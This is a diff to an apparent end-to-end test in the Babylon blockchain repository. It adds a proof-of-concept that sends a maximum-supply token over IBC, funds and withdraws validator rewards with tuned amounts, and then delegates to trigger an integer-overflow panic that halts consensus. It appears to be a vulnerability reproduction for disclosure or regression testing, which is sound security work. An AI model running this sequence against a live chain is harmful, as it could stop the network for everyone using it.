@@ -17,11 +17,13 @@ import (
 
 	"cosmossdk.io/math"
 	"github.com/babylonlabs-io/babylon/v3/test/e2e/configurer"
+	"github.com/babylonlabs-io/babylon/v3/test/e2e/initialization"
 	"github.com/babylonlabs-io/babylon/v3/testutil/datagen"
 	sdk "github.com/cosmos/cosmos-sdk/types"
-	"github.com/test-go/testify/require"
+	ibctransfertypes "github.com/cosmos/ibc-go/v10/modules/apps/transfer/types"
 
 	"github.com/stretchr/testify/suite"
+	"github.com/test-go/testify/require"
 )
 
 const (
@@ -44,8 +46,8 @@ func (s *MathOverflowTest) SetupSuite() {
 
 	s.r = rand.New(rand.NewSource(time.Now().Unix()))
 
-	// s.configurer, err = configurer.NewIBCTransferConfigurer(s.T(), true)
-	s.configurer, err = configurer.NewBabylonConfigurer(s.T(), true)
+	s.configurer, err = configurer.NewIBCTransferConfigurer(s.T(), true)
+	// s.configurer, err = configurer.NewBabylonConfigurer(s.T(), true)
 
 	s.Require().NoError(err)
 
@@ -70,7 +72,85 @@ can be exploited in unique way with the distribution overflow. A couple of diffe
 2. Validator does not have to be in active set
 3. Uses panic caused by delegation action, which is executed in epoching.EndBlocker
 */
-func (s *MathOverflowTest) TestOverflowNoSlashing() {
+func (s *MathOverflowTest) Test1OverflowNoSlashing() {
+	chainA := s.configurer.GetChainConfig(0)
+	chainB := s.configurer.GetChainConfig(1)
+
+	// Node A, which custom denom (utest) with supply of MAX_INT_256 already minted
+	nodeA, err := chainA.GetNodeAtIndex(2)
+	s.NoError(err)
+	s.valAccAddrA = nodeA.WalletName
+
+	nodeB, err := chainB.GetNodeAtIndex(2)
+	s.NoError(err)
+	s.valAccAddrB = nodeB.WalletName
+
+	denomA := initialization.TestDenom
+	maxSupply, ok := math.NewIntFromString(initialization.MaxSupply)
+	s.Require().True(ok)
+	transferCoin := sdk.NewCoin(denomA, maxSupply)
+
+	// Transfer test denom from chain A to chain B
+	nodeA.SendIBCTransfer(s.valAccAddrA, s.valAccAddrB, "transfer", transferCoin)
+	nodeB.WaitForNextBlocks(15)
+
+	// Wait until denom is received on chain B
+	denomTrace := ibctransfertypes.ParseDenomTrace(ibctransfertypes.GetPrefixedDenom("transfer", "channel-0", denomA))
+	ibcDenomA := denomTrace.IBCDenom()
+	s.Require().Eventually(func() bool {
+		balances, err := nodeB.QueryBalances(s.valAccAddrB)
+		if err != nil {
+			return false
+		}
+		ibcDenomAAmount := balances.AmountOf(ibcDenomA)
+		return ibcDenomAAmount.String() == maxSupply.String()
+	}, 3*time.Minute, 1*time.Second, "Transfer was not successful")
+
+	// Use test denom to fund validator rewards pool
+	valAddrB := sdk.ValAddress(sdk.MustAccAddressFromBech32(s.valAccAddrB)).String()
+	rewardsAmount := sdk.NewCoin(ibcDenomA, maxSupply).String()
+	nodeB.FundValidatorRewardsPool(s.valAccAddrB, valAddrB, rewardsAmount)
+	nodeB.WaitForNextBlocks(15)
+
+	// Withdraw validator rewards for validator
+	nodeB.WithdrawValidatorRewards(s.valAccAddrB, valAddrB, "--commission")
+	nodeB.WaitForNextBlocks(15)
+
+	// Fund more rewards to make up for deducted commission
+	rewardsAmountInt, ok := math.NewIntFromString("5963292596005040462609982330006597585015759079040119860848489729157008230953")
+	s.True(ok)
+	rewardsAmount = sdk.NewCoin(ibcDenomA, rewardsAmountInt).String()
+	nodeB.FundValidatorRewardsPool(s.valAccAddrB, valAddrB, rewardsAmount)
+	nodeB.WaitForNextBlocks(15)
+
+	// Withdraw validator rewards for validator again
+	nodeB.WithdrawValidatorRewards(s.valAccAddrB, valAddrB, "--commission")
+	nodeB.WaitForNextBlocks(15)
+
+	// Fund more validator rewards with remaining balance
+	ibcDenomABalance, err := nodeB.QueryBalance(s.valAccAddrB, ibcDenomA)
+	s.NoError(err)
+	rewardsAmount = ibcDenomABalance.String()
+	nodeB.FundValidatorRewardsPool(s.valAccAddrB, valAddrB, rewardsAmount)
+	nodeB.WaitForNextBlocks(15)
+
+	delegateAmt := sdk.NewCoin(initialization.BabylonDenom, math.OneInt()).String()
+	nodeB.Delegate(s.valAccAddrB, valAddrB, delegateAmt)
+	nodeB.WaitForNextBlocks(15)
+
+	time.Sleep(5 * time.Minute)
+
+	// Search docker logs on any chain B node for "Int overflow" or "ERR CONSENSUS FAILURE!!!"
+}
+
+/*
+This test is a slight modification of the original test that shows how Babylon
+can be exploited in unique way with the distribution overflow. A couple of differences from original test:
+1. Does not require slashing to occur
+2. Validator does not have to be in active set
+3. Uses panic caused by delegation action, which is executed in epoching.EndBlocker
+*/
+func (s *MathOverflowTest) Test2MathOverflowTokenFactory() {
 	chainA := s.configurer.GetChainConfig(0)
 
 	nA2, err := chainA.GetNodeAtIndex(2)
